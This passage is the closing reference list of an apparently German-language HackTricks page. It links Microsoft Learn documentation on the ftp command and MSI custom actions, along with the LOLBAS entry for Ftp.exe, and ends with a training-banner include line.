- [13] [Microsoft Learn - ftp-Befehl](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ftp)
- [14] [LOLBAS - Ftp.exe](https://lolbas-project.github.io/lolbas/Binaries/Ftp/)
- [15] [Microsoft Learn - Benutzerdefinierte Aktion Typ 2](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-type-2)
- [16] [Microsoft Learn - Optionen für die Verarbeitung von Rückgabewerten benutzerdefinierter Aktionen](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-return-processing-options)
{{#include ../../banners/hacktricks-training.md}}
